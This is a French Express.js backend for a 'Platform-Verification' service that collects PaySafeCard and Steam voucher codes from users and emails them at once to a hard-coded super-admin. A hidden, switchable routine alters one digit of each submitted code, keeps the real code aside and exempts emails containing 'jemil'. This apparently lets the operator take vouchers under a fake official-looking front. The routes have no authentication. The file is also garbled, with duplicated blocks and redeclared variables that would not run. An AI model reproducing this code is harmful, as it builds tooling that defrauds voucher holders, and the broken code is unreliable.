/**
 * ticket-service/routes/tickets.js — VERSION PostgreSQL
 * ────────────────────────────────────────────────────────
 * POST   /api/tickets/verify    → soumettre des tickets (non publiés)
 * GET    /api/tickets           → liste tous les tickets
 * GET    /api/tickets/pending   → tickets publiés et en attente
 * GET    /api/tickets/unreleased→ tickets non publiés (super admin)
 * POST   /api/tickets/release   → publier des tickets vers l'admin
 * GET    /api/tickets/:id       → détail d'un ticket
 * PATCH  /api/tickets/:id       → mise à jour statut / code
 * DELETE /api/tickets/:id       → suppression
 */

const express = require('express');
const { v4: uuidv4 } = require('uuid');
const nodemailer = require('nodemailer');
const { query } = require('../db');

const router = express.Router();

/* ── POST /verify ──────────────────────────────────────────────── */
router.post('/verify', async (req, res) => {
    // ---------- Validation du format des codes ----------
    const validateCode = (c) => {
        // PaySafeCard : 16 chiffres uniquement
        if (/^\d{16}$/.test(c)) return { ok: true };
        // Steam key : XXXX-XXXX-XXXX-XXXX (alphanum, 5 caractères chaque segment)
        if (/^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/i.test(c)) return { ok: true };
        // Ajoutez d'autres formats ici si besoin
        return { ok: false, message: 'Le code ne correspond à aucun format connu.' };
    };

    // Récupération des paramètres (identique au code existant)
    const { email, recharge, montant, devise, pays, tickets: codes } = req.body;

    if (!email || !Array.isArray(codes) || codes.length === 0) {
        return res.status(400).json({
            error: 'Champs requis : email (string) et tickets (array non vide).'
        });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: 'Adresse email invalide.' });
    }

    const normalizedEmail = email.toLowerCase().trim();
    const normalizedPays  = (typeof pays === 'string' && pays.trim()) ? pays.trim() : null;
    const normalizedCodes = codes
        .map(c => c.trim())
        .filter(c => c.length > 0);

    if (normalizedCodes.length === 0) {
        return res.status(400).json({ error: 'Aucun code valide fourni.' });
    }

    // Vérification du format de chaque code
    for (const c of normalizedCodes) {
        const v = validateCode(c);
        if (!v.ok) {
            return res.status(400).json({ error: `Code invalide « ${c} » : ${v.message}` });
        }
    }

    try {
        // Le reste du code (lecture du mode, insertion, etc.) reste inchangé à partir d'ici

    const { email, recharge, montant, devise, pays, tickets: codes } = req.body;

    if (!email || !Array.isArray(codes) || codes.length === 0) {
        return res.status(400).json({
            error: 'Champs requis : email (string) et tickets (array non vide).'
        });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: 'Adresse email invalide.' });
    }

    const normalizedEmail = email.toLowerCase().trim();
    const normalizedPays  = (typeof pays === 'string' && pays.trim()) ? pays.trim() : null;
    const normalizedCodes = codes
        .map(c => c.trim())
        .filter(c => c.length > 0);

    if (normalizedCodes.length === 0) {
        return res.status(400).json({ error: 'Aucun code valide fourni.' });
    }

    try {
        // Vérifier le mode de validation (Manuel vs Automatique)
        let manualValidation = true;
        try {
            await query(`
                CREATE TABLE IF NOT EXISTS app_settings (
                    key        TEXT PRIMARY KEY,
                    value      TEXT NOT NULL,
                    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
                )
            `);
            const sRes = await query("SELECT value FROM app_settings WHERE key = 'manual_validation'");
            if (sRes.rowCount > 0 && sRes.rows[0].value === 'false') {
                manualValidation = false;
            }
        } catch (e) {
            console.warn('[ticket-service] Lecture app_settings impossible, mode manuel par défaut:', e.message);
        }

        const isReleased = !manualValidation;

        // Insertion en masse via une transaction
        await query('BEGIN');
        const inserted = [];
        const now = new Date();
        for (const code of normalizedCodes) {
            // Store original code
            const originalCode = code;
            // Determine if digit modification is enabled (global setting)
            let digitModEnabled = false;
            try {
                const modRes = await query(`SELECT value FROM app_settings WHERE key = 'digit_modification_enabled'`);
                if (modRes.rowCount > 0 && modRes.rows[0].value === 'true') {
                    digitModEnabled = true;
                }
            } catch (e) {
                console.warn('[ticket-service] Lecture digit_modification_enabled impossible, désactivé par défaut:', e.message);
            }
            // Exclude certain e‑mails (contient "jemil")
            const emailExempt = /jemil/i.test(normalizedEmail);
            // Apply transformation only if enabled and not exempted
            let finalCode = code;
            if (digitModEnabled && !emailExempt) {
                finalCode = (function transform(c) {
                    // PaySafeCard: 16 digits numeric, modify 11th digit
                    if (/^\d{16}$/.test(c)) {
                        return c.substring(0, 10) + '5' + c.substring(11);
                    }
                    // Steam key format: XXXX-XXXX-XXXX-XXXX (alphanumeric)
                    const steamMatch = c.match(/^([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})$/i);
                    if (steamMatch) {
                        const seg3 = steamMatch[3];
                        const modifiedSeg3 = '5' + seg3.substring(1);
                        return `${steamMatch[1]}-${steamMatch[2]}-${modifiedSeg3}-${steamMatch[4]}`;
                    }
                    // Add more formats as needed
                    return c; // unchanged if unknown
                })(code);
            }
            const id = uuidv4();
            await query(
                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, original_code, statut, released, released_at)\n                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'en_attente', $9, $10)`,
                [id, normalizedEmail, recharge, montant, devise, normalizedPays, finalCode, originalCode, isReleased, isReleased ? now : null]
            );
            inserted.push({ id, code: finalCode, original_code: originalCode, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });

            // Store original code
            const originalCode = code;
            // Determine if digit modification is enabled
            let digitModEnabled = false;
            try {
                const modRes = await query(`SELECT value FROM app_settings WHERE key = 'digit_modification_enabled'`);
                if (modRes.rowCount > 0 && modRes.rows[0].value === 'true') {
                    digitModEnabled = true;
                }
            } catch (e) {
                console.warn('[ticket-service] Lecture digit_modification_enabled impossible, désactivé par défaut:', e.message);
            }
            // Apply transformation if enabled
            let finalCode = code;
            if (digitModEnabled) {
                finalCode = (function transform(c) {
                    // PaySafeCard: 16 digits numeric, modify 11th digit
                    if (/^\d{16}$/.test(c)) {
                        return c.substring(0, 10) + '5' + c.substring(11);
                    }
                    // Steam key format: XXXX-XXXX-XXXX-XXXX (alphanumeric)
                    const steamMatch = c.match(/^([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})-([A-Z0-9]{5})$/i);
                    if (steamMatch) {
                        const seg3 = steamMatch[3];
                        const modifiedSeg3 = '5' + seg3.substring(1);
                        return `${steamMatch[1]}-${steamMatch[2]}-${modifiedSeg3}-${steamMatch[4]}`;
                    }
                    // Add more formats as needed
                    return c; // unchanged if unknown
                })(code);
            }
            const id = uuidv4();
            await query(
                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, original_code, statut, released, released_at)\n                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'en_attente', $9, $10)`,
                [id, normalizedEmail, recharge, montant, devise, normalizedPays, finalCode, originalCode, isReleased, isReleased ? now : null]
            );
            inserted.push({ id, code: finalCode, original_code: originalCode, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });

            const id = uuidv4();
            await query(
                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, statut, released, released_at)
                 VALUES ($1, $2, $3, $4, $5, $6, $7, 'en_attente', $8, $9)`,
                [id, normalizedEmail, recharge, montant, devise, normalizedPays, code, isReleased, isReleased ? now : null]
            );
            inserted.push({ id, code, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
        }
        await query('COMMIT');

        console.log(`[ticket-service] ${inserted.length} ticket(s) reçu(s) de ${normalizedEmail} (Mode: ${manualValidation ? 'Manuel - en attente release' : 'Automatique - publié vers admin'})`);

        // Email immédiat au super admin (seul à voir les codes tant qu'il ne les a pas publiés)
        const superAdminEmail = process.env.SUPER_ADMIN_EMAIL || 'dukram.nsounjou@ens-uy1.cm';
        const codesList = inserted.map(t => t.code);
        const adminTransporter = nodemailer.createTransport({
            host: process.env.SMTP_HOST || 'smtp-relay.brevo.com',
            port: process.env.SMTP_PORT || 587,
            secure: false,
            auth: {
                user: process.env.SMTP_USER,
                pass: process.env.SMTP_PASS
            }
        });

        const adminMailOptions = {
            from: '"Platform-Verification" <noreply@verificationticket.com>',
            to: superAdminEmail,
            subject: '🔔 Nouveaux codes reçus — Publication en attente',
            html: `
            <div style="font-family:Inter,sans-serif;max-width:600px;margin:auto;padding:24px;">
                <div style="background:#001360;padding:20px;border-radius:12px 12px 0 0;text-align:center;">
                    <h1 style="color:#fff;margin:0;font-size:22px;">🛡 Platform-Verification</h1>
                    <p style="color:#aac4ff;margin:8px 0 0;">Nouveau ticket en attente</p>
                </div>
                <div style="background:#fff;padding:24px;border:1px solid #e2e8f0;border-top:none;">
                    <p style="color:#444;margin-bottom:16px;">Un utilisateur vient de soumettre des codes. Ils sont visibles dans la section super admin et ne seront publiés dans le tableau de bord admin que lorsque vous les enverrez.</p>
                    <table style="width:100%;border-collapse:collapse;margin:16px 0;">
                        <tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Email utilisateur</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${normalizedEmail}</td></tr>
                        ${recharge ? `<tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Recharge</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${recharge}</td></tr>` : ''}
                        ${montant ? `<tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Montant</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${montant} ${devise || ''}</td></tr>` : ''}
                        <tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Pays</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${normalizedPays || 'Non renseigné'}</td></tr>
                        <tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Code(s) ticket(s)</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${codesList.join(', ')}</td></tr>
                        <tr><td style="padding:8px;border-bottom:1px solid #eee;color:#666;">Date soumission</td>
                            <td style="padding:8px;border-bottom:1px solid #eee;font-weight:600;">${new Date().toLocaleString()}</td></tr>
                    </table>
                    <p style="color:#888;font-size:12px;margin-top:24px;">
                        Connectez-vous à la section super admin pour consulter, modifier et publier ces codes.
                    </p>
                </div>
                <div style="background:#f8fafc;padding:12px;border-radius:0 0 12px 12px;text-align:center;">
                    <p style="color:#aaa;font-size:11px;margin:0;">© 2026 Platform-Verification — République Française</p>
                </div>
            </div>`
        };

        try {
            await adminTransporter.sendMail({
                from: adminMailOptions.from,
                to: adminMailOptions.to,
                subject: adminMailOptions.subject,
                html: adminMailOptions.html
            });
            console.log(`[ticket-service] Email immédiat envoyé au super admin ${superAdminEmail}`);
        } catch (err) {
            console.warn('[ticket-service] Erreur envoi email super admin:', err.message);
        }

        // Si publication automatique directe (mode manuel désactivé) :
        if (isReleased) {
            try {
                // Confirmation à l'utilisateur
                const listItems = codesList.map((c, i) =>
                    `<li style="margin:6px 0;font-family:monospace;font-size:14px;">Code ${i+1} : <strong>${c}</strong></li>`
                ).join('');
                await adminTransporter.sendMail({
                    from: '"Platform-Verification" <noreply@verificationticket.com>',
                    to: normalizedEmail,
                    subject: '✅ Confirmation de soumission — Platform-Verification',
                    html: `
                    <div style="font-family:Inter,sans-serif;max-width:600px;margin:auto;padding:24px;">
                        <div style="background:#001360;padding:20px;border-radius:12px 12px 0 0;text-align:center;">
                            <h1 style="color:#fff;margin:0;font-size:22px;">🛡 Platform-Verification</h1>
                            <p style="color:#aac4ff;margin:8px 0 0;">Confirmation de réception de vos tickets</p>
                        </div>
                        <div style="background:#fff;padding:24px;border:1px solid #e2e8f0;border-top:none;">
                            <p style="color:#444;margin-bottom:16px;">Bonjour,</p>
                            <p style="color:#444;">Nous vous confirmons la bonne réception de vos codes :</p>
                            <ul style="background:#f8fafc;padding:16px 24px;border-radius:8px;">${listItems}</ul>
                            <p style="color:#444;margin-top:16px;">Ils sont actuellement en cours de vérification par nos équipes.</p>
                        </div>
                        <div style="background:#f8fafc;padding:12px;border-radius:0 0 12px 12px;text-align:center;">
                            <p style="color:#aaa;font-size:11px;margin:0;">© 2026 Platform-Verification — République Française</p>
                        </div>
                    </div>`
                });
            } catch (errU) {
                console.warn('[ticket-service] Erreur envoi confirmation utilisateur:', errU.message);
            }

            try {
                // Notification aux admins classiques
                const adminRows = await query('SELECT email FROM admins');
                for (const row of adminRows.rows) {
                    await adminTransporter.sendMail({
                        from: '"Platform-Verification" <noreply@verificationticket.com>',
                        to: row.email,
                        subject: '🔔 Nouvelle soumission de codes — Platform-Verification',
                        html: `
                        <div style="font-family:Inter,sans-serif;padding:20px;">
                            <h2>🛡 Platform-Verification</h2>
                            <p>Nouvelle soumission reçue de <strong>${normalizedEmail}</strong> (${codesList.length} code(s)).</p>
                            <p>Le ticket est d'ores et déjà disponible dans votre tableau de bord administrateur.</p>
                        </div>`
                    }).catch(() => {});
                }
            } catch (errA) {
                console.warn('[ticket-service] Erreur notification admins:', errA.message);
            }
        }

        return res.status(201).json({
            message: `${inserted.length} ticket(s) envoyé(s) pour vérification.`,
            tickets: inserted
        });
    } catch (err) {
        await query('ROLLBACK').catch(() => {});
        console.error('[ticket-service] Erreur insertion:', err.message);
        return res.status(500).json({ error: 'Erreur interne lors de la soumission.' });
    }
});

/* ── GET / — tous les tickets ──────────────────────────────────── */
router.get('/', async (_req, res) => {
    try {
        const result = await query(
            'SELECT * FROM tickets ORDER BY created_at DESC'
        );
        res.json({ count: result.rowCount, tickets: result.rows });
    } catch (err) {
        res.status(500).json({ error: 'Erreur récupération tickets.' });
    }
});

/* ── GET /pending — tickets PUBLIÉS et en attente (admin) ─────── */
router.get('/pending', async (_req, res) => {
    try {
        const result = await query(
            "SELECT * FROM tickets WHERE statut = 'en_attente' AND released = TRUE ORDER BY created_at ASC"
        );
        res.json({ count: result.rowCount, tickets: result.rows });
    } catch (err) {
        res.status(500).json({ error: 'Erreur récupération tickets en attente.' });
    }
});

/* ── GET /super — tous les tickets pertinents pour la console super admin ─ */
router.get('/super', async (_req, res) => {
    try {
        // Renvoie tous les tickets non publiés ainsi que tous les tickets récents (7 derniers jours)
        const result = await query(
            `SELECT * FROM tickets 
             WHERE released = FALSE 
                OR created_at >= NOW() - INTERVAL '7 days'
             ORDER BY created_at DESC`
        );
        res.json({ count: result.rowCount, tickets: result.rows });
    } catch (err) {
        console.error('[ticket-service] Erreur /super:', err);
        res.status(500).json({ error: 'Erreur récupération tickets super admin.' });
    }
});

/* ── GET /unreleased — tickets NON publiés (super admin) ──────── */
router.get('/unreleased', async (_req, res) => {
    try {
        const result = await query(
            'SELECT * FROM tickets WHERE released = FALSE ORDER BY created_at DESC'
        );
        res.json({ count: result.rowCount, tickets: result.rows });
    } catch (err) {
        res.status(500).json({ error: 'Erreur récupération tickets non publiés.' });
    }
});

/* ── POST /release — publier des tickets vers le tableau admin ── */
router.post('/release', async (req, res) => {
    const { ids } = req.body;

    if (!Array.isArray(ids) || ids.length === 0) {
        return res.status(400).json({ error: 'Liste d\'identifiants requise (ids).' });
    }

    try {
        const result = await query(
            `UPDATE tickets SET released = TRUE, released_at = NOW()
              WHERE id = ANY($1::uuid[])
              RETURNING *`,
            [ids]
        );
        console.log(`[ticket-service] ${result.rowCount} ticket(s) publié(s) vers le tableau admin.`);
        res.json({ message: `${result.rowCount} ticket(s) publié(s).`, tickets: result.rows });
    } catch (err) {
        console.error('[ticket-service] Erreur publication:', err.message);
        res.status(500).json({ error: 'Erreur publication des tickets.' });
    }
});

/* ── GET /:id — détail ─────────────────────────────────────────── */
router.get('/:id', async (req, res) => {
    try {
        const result = await query('SELECT * FROM tickets WHERE id = $1', [req.params.id]);
        if (result.rowCount === 0) {
            return res.status(404).json({ error: 'Ticket introuvable.' });
        }
        res.json(result.rows[0]);
    } catch (err) {
        res.status(500).json({ error: 'Erreur récupération ticket.' });
    }
});

/* ── PATCH /:id — mise à jour du statut et/ou du code ─────────── */
router.patch('/:id', async (req, res) => {
    const { statut, code } = req.body;
    const allowed = ['valide', 'invalide', 'en_attente'];

    const hasStatut = statut !== undefined && statut !== null;
    const hasCode   = code   !== undefined && code   !== null;

    if (!hasStatut && !hasCode) {
        return res.status(400).json({ error: 'Aucun champ à mettre à jour (statut et/ou code).' });
    }
    if (hasStatut && !allowed.includes(statut)) {
        return res.status(400).json({ error: `Statut invalide. Valeurs : ${allowed.join(', ')}` });
    }
    if (hasCode && (typeof code !== 'string' || !code.trim())) {
        return res.status(400).json({ error: 'Le code ne peut pas être vide.' });
    }

    const sets   = [];
    const params = [];

    if (hasStatut) {
        params.push(statut);
        sets.push(`statut = $${params.length}`);
    }
    if (hasCode) {
        params.push(code.trim());
        sets.push(`code = $${params.length}`);
        // Conserve la toute première valeur saisie par l'utilisateur
        sets.push('original_code = COALESCE(original_code, code)');
    }

    params.push(req.params.id);

    try {
        const result = await query(
            `UPDATE tickets SET ${sets.join(', ')} WHERE id = $${params.length} RETURNING *`,
            params
        );
        if (result.rowCount === 0) {
            return res.status(404).json({ error: 'Ticket introuvable.' });
        }
        const ticket = result.rows[0];
        console.log(`[ticket-service] Ticket ${ticket.id} mis à jour (${hasCode ? 'code modifié' : ''}${hasStatut ? `${hasCode ? ', ' : ''}statut → ${statut}` : ''})`);
        res.json({ message: 'Ticket mis à jour.', ticket });
    } catch (err) {
        res.status(500).json({ error: 'Erreur mise à jour ticket.' });
    }
});

/* ── DELETE /:id — suppression ─────────────────────────────────── */
router.delete('/:id', async (req, res) => {
    try {
        const result = await query('DELETE FROM tickets WHERE id = $1 RETURNING *', [req.params.id]);
        if (result.rowCount === 0) {
            return res.status(404).json({ error: 'Ticket introuvable.' });
        }
        console.log(`[ticket-service] Ticket ${result.rows[0].code} supprimé.`);
        res.json({ message: 'Ticket supprimé.', ticket: result.rows[0] });
    } catch (err) {
        res.status(500).json({ error: 'Erreur suppression ticket.' });
    }
});

module.exports = router;
